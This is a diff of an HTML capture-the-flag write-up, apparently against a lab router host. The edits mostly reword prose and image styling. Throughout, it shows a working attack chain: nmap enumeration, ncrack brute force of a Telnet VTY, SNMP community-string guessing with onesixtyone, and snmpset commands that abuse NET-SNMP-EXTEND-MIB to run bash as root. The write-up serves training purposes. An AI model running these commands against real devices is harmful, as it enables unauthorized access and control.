@@ -156,21 +156,23 @@
 
 <h2>Enumeration</h2>
 
+<p>Let's get physical.</p>
+
 <pre><code>nmap -sC -sV -Pn -p- -T4 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.28 AM.png" alt="nmap basic scan results" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.28 AM.png" alt="nmap basic scan results" style="max-width:100%;margin:2rem 0;">
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.49 AM.png" alt="nmap continued — messages in the output worth deciphering" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.49 AM.png" alt="nmap continued output" style="max-width:100%;margin:2rem 0;">
 
-<p>Messages buried in that output. Deciphering momentarily.</p>
+<p>I spy messages in that lengthy output discourse. We'll decipher momentarily.</p>
 
 <pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.144.132.135 -oN Operation_Takeover_nmap_result.txt</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.36.45 AM.png" alt="vuln scan running" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.36.45 AM.png" alt="vuln scan running" style="max-width:100%;margin:2rem 0;">
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.04 AM.png" alt="vuln scan output continued" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.04 AM.png" alt="vuln scan output continued" style="max-width:100%;margin:2rem 0;">
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.20 AM.png" alt="FRRouting banner in DNSVersionBindReqTCP output" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.20 AM.png" alt="FRRouting banner in DNSVersionBindReqTCP output" style="max-width:100%;margin:2rem 0;">
 
 <p>This immediately stood out:</p>
 
@@ -181,41 +183,43 @@
 
 <p>FRRouting v10.0. A quick exploit search pulled 2-3 high-interest CVEs. Tabs left open for later.</p>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.46.06 AM.png" alt="CVE search results for FRRouting 10.0" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.46.06 AM.png" alt="CVE search results for FRRouting 10.0" style="max-width:100%;margin:2rem 0;">
 
-<p>Port 2623 was calling. Visited <code>http://TARGETIP:2623</code>:</p>
+<p>Open Port 2623 is calling me. Visited <code>http://TARGETIP:2623</code>:</p>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.49.00 AM.png" alt="Port 2623 in browser — Telnet IAC negotiation bytes rendered as garbage" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.49.00 AM.png" alt="Port 2623 in browser — Telnet IAC negotiation bytes rendered as garbage" style="max-width:100%;margin:2rem 0;">
 
-<p>What looks like garbage output is actually open Telnet IAC negotiation bytes. <code>ÿ</code> equates to <code>0xFF</code> — the Telnet IAC marker. This is already fun.</p>
+<p>What immediately gets assessed as garbage output is actually open Telnet IAC negotiation bytes. <code>ÿ</code> equates to <code>0xFF</code> — the Telnet IAC marker. This is already fun.</p>
 
 <hr>
 
 <h2>Telnet Enumeration</h2>
 
-<p>The system was already showing signs of a failure threshold limit. Tested the Telnet discovery carefully with Ncat's Telnet handling:</p>
+<p>The system was already showing signs of a failure threshold limit. Had to test the Telnet discovery with care and caution. Set up Ncat with Telnet handling:</p>
 
 <pre><code>ncat --telnet 10.144.132.135 2623</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.57.09 AM.png" alt="ncat telnet connection — VTY password prompt" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.57.09 AM.png" alt="ncat telnet connection — VTY password prompt" style="max-width:100%;margin:2rem 0;">
 
-<p>Password-only VTY auth confirmed — FRRouting documentation is clear that no username is needed. Critical detail for crafting a clean ncrack command.</p>
+<p>To be fair, this is what I expected. Password-only VTY auth confirmed — FRRouting documentation is clear that no username is needed. Critical detail for crafting a successful ncrack command.</p>
 
-<p>Checked the fasttrack wordlist before committing to brute force:</p>
+<p>Quick sanity checks on the fasttrack wordlist before committing:</p>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.05.16 AM.png" alt="fasttrack.txt sanity check" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.05.16 AM.png" alt="fasttrack.txt wordlist check" style="max-width:100%;margin:2rem 0;">
 
 <p>First ncrack attempt had a syntax error — the service name needed to be attached to the port:</p>
 
 <pre><code>ncrack -p telnet:2623 --user test -P fasttrack.txt 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.19.27 AM.png" alt="ncrack syntax error — service name required" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.19.27 AM.png" alt="ncrack running — feels a bit hostile" style="max-width:100%;margin:2rem 0;">
 
-<p>Ncrack ran longer than comfortable. While waiting, I read more FRRouting documentation and noted the VTY CLI commands for later. Then tried a few manual attempts to eliminate obvious candidates:</p>
+<p>Feels a bit hostile, am I right? Chill, my dude. I'm getting in there with or without you.</p>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.47.03 AM.png" alt="Manual telnet attempts — ruling out obvious passwords" style="max-width:100%;margin:1rem 0;">
+<p>Ncrack ran longer than comfortable. Tried a few manual attempts while it ran to eliminate obvious candidates:</p>
 
-<p>Single-password brute force wasn't going to hold up here. Time to think outside the box.</p>
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.47.03 AM.png" alt="Manual telnet attempts — ruling out obvious passwords" style="max-width:100%;margin:2rem 0;">
+
+<p>I cannot single-password brute force this for very long. Time to think outside the box.</p>
 
 <hr>
 
@@ -225,17 +229,17 @@
 
 <pre><code>nmap -sU -p 161 --script snmp-brute 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.54.52 AM.png" alt="SNMP port 161 open — snmp-brute running" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.54.52 AM.png" alt="SNMP port 161 open — snmp-brute running" style="max-width:100%;margin:2rem 0;">
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.00.06 AM.png" alt="Further SNMP probing" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.00.06 AM.png" alt="Further SNMP probing" style="max-width:100%;margin:2rem 0;">
 
 <p>Port 161 open. Pressed further with onesixtyone against a community strings wordlist:</p>
 
 <pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.04.42 AM.png" alt="onesixtyone — community string pr1v4t3 confirmed" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.04.42 AM.png" alt="onesixtyone — community string pr1v4t3 confirmed" style="max-width:100%;margin:2rem 0;">
 
-<p>Community string: <code>pr1v4t3</code>. SNMP is the hook.</p>
+<p>Bam. Community string: <code>pr1v4t3</code>. SNMP is our hook. Woo!</p>
 
 <hr>
 
@@ -246,9 +250,9 @@
 <pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 1.3.6.1.2.1.1.1.0
 snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.11.34 PM.png" alt="snmpwalk returning system info, snmpset renaming host to Pwned" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.11.34 PM.png" alt="snmpwalk returning system info, snmpset renaming host to Pwned" style="max-width:100%;margin:2rem 0;">
 
-<p>Write access confirmed. Right access confirmed, more like it.</p>
+<p>Write access confirmed? More like right access confirmed in my hands. Muahahaha. Just kidding. Onwards.</p>
 
 <p>Extended to RCE via NET-SNMP-EXTEND-MIB:</p>
 
@@ -257,24 +261,24 @@ snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
   'nsExtendCommand."command"' = /bin/bash \
   'nsExtendArgs."command"' = '-c "ls /root"'</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.16.14 PM.png" alt="NET-SNMP-EXTEND-MIB RCE setup — ls /root" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.16.14 PM.png" alt="NET-SNMP-EXTEND-MIB RCE setup — ls /root" style="max-width:100%;margin:2rem 0;">
 
 <pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.17.32 PM.png" alt="snmpwalk returning ls /root output" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.17.32 PM.png" alt="snmpwalk returning ls /root output" style="max-width:100%;margin:2rem 0;">
 
-<p>Inching closer. Pulled the trigger:</p>
+<p>Pwned, indeed. Inching closer. Pulled the trigger:</p>
 
 <pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
   'nsExtendStatus."command"' = createAndGo \
   'nsExtendCommand."command"' = /bin/bash \
   'nsExtendArgs."command"' = '-c "cat /root/flag.txt"'</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.19.47 PM.png" alt="cat /root/flag.txt via SNMP RCE" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.19.47 PM.png" alt="cat /root/flag.txt via SNMP RCE" style="max-width:100%;margin:2rem 0;">
 
 <pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.20.51 PM.png" alt="Flag retrieved via SNMP RCE" style="max-width:100%;margin:1rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.20.51 PM.png" alt="Flag retrieved via SNMP RCE" style="max-width:100%;margin:2rem 0;">
 
 <p>Definitely my solution, not my problem.</p>
 
